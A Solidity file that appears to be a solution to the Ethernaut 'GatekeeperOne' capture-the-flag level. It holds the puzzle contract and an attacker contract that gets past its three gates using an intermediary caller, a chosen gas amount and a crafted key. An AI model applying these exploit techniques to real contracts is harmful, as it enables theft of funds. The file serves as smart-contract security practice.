// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./utils/SafeMath.sol";

contract GatekeeperOne {
    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0, "Gas Not Correct");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        // console.logBytes8(_gateKey);
        // console.log("uint32(uint64(_gateKey)) %s", uint32(uint64(_gateKey)));
        // console.log("uint64(_gateKey) %s", uint64(_gateKey));
        // console.log("uint16(tx.origin) %s", uint16(tx.origin));
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(tx.origin),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract AttackGateKeeperOne {
    GatekeeperOne gateKeeper;

    constructor(address addr) public {
        gateKeeper = GatekeeperOne(addr);
    }

    function Attack(bytes8 gateKey, uint256 gasUse)
        external
        payable
        returns (bool)
    {
        return gateKeeper.enter.gas(gasUse)(gateKey);
    }
}
